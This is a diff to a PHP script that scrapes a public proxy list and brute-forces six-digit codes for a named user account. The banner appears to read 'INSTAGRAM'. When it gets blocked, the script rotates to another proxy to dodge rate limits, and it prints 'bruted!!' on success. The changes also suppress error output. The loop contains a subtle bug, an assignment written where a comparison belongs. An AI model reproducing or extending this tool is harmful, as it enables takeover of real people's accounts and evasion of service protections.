@@ -3,6 +3,9 @@
 //"contactAuthor":"yus17726@gmail.com"
 //"facebookAuthor":"http://facebook.com/yus.127.0.0.1"
 
+error_reporting(0);
+ini_set('display_errors',0);
+
 $urlprox = file_get_contents("https://free-proxy-list.net/");
 preg_match_all("'<tr>(.*?)</tr>'si", $urlprox, $prox);
 
@@ -23,7 +26,19 @@ $size = filesize("listip.txt");
 $read = fread($open, $size);
 $lists = explode("\n", $read);
 
-error_reporting(0);
+/*print "
+
+             /\
+            ( ;`~v/~~~ ;._
+         ,/'\"/^) ' < o\  '\".~'\\\--,
+       ,/\",/W  u '`. ~  >,._..,   )'
+      ,/'  w  ,U^v  ;//^)/')/^\;~)'
+   ,/\"'/   W` ^v  W |;         )/'
+ ;''  |  v' v`\" W }  \\
+\"    .'\    v  `v/^W,) '\)\.)\/)
+                   `\   ,/,)'   ''')/^\"-;'
+                        \
+                         '\". _";*/
 
 print '
  _____ _   _  _____ _______       _____ _____            __  __ 
@@ -116,16 +131,26 @@ function crotz($x, $y, $z)
 
 for($i = 0; $i <= 9999999999999; $i++)
 {
+	if($lists[$l] != ":"){
 		print "trying with proxy => ".$lists[$l]."\n";
 		$return = crotz($user, sprintf('%06d', $i), $lists[$l]);
 
 		if($return == "block"){
 			while ($l <= count($lists)) {
-				$l = $l+1;
-				print "trying with proxy => ".$lists[$l]."\n";
-				$return = crotz($user, sprintf('%06d', $i), $lists[$l]);
-				
-				if($return == "success" || $return != "block"){
+				if($l = count($lists)){
+					$l = 0;
+				} else {
+					$l = $l+1;
+				}
+
+				if($lists[$l] != ":" || !empty($lists[$l])){
+					print "trying with proxy => ".$lists[$l]."\n";
+					$return = crotz($user, sprintf('%06d', $i), $lists[$l]);
+
+					if($return == "success" || $return != "block"){
+						break;
+					}
+				} else {
 					break;
 				}
 			}
@@ -133,7 +158,10 @@ for($i = 0; $i <= 9999999999999; $i++)
 			print "bruted!!";
 			break;
 		}
-
+	} else {
+		print "You should check your internet!";
+		break;
+	}
 }
 
 ?>
